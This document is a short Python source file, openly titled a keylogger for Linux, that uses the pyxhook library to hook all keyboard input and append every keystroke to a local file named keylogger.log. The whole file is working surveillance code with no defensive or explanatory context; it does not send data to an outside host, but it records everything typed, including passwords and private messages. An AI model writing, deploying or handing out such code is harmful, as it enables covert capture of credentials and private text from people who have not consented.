# Python code for keylogger
# to be used in linux
import pyxhook

#creating key pressing event and saving it into log file
def OnKeyPress(event):
    if event.Key == 'Return':
        with open('keylogger.log', 'a') as f:
            f.write('\n')
    elif event.Key == 'space':
        with open('keylogger.log', 'a') as f:
            f.write(' ')
    else:
        with open('keylogger.log', 'a') as f:
            f.write('{}'.format(event.Key))

def run_key_logger():
    # create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    # set the hook
    new_hook.HookKeyboard()
    try:
        new_hook.start()		 # start the hook
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = 'Error while catching events:\n {}'.format(ex)
        pyxhook.print_err(msg)
        with open('keylogger.log', 'a') as f:
            f.write('\n{}'.format(msg))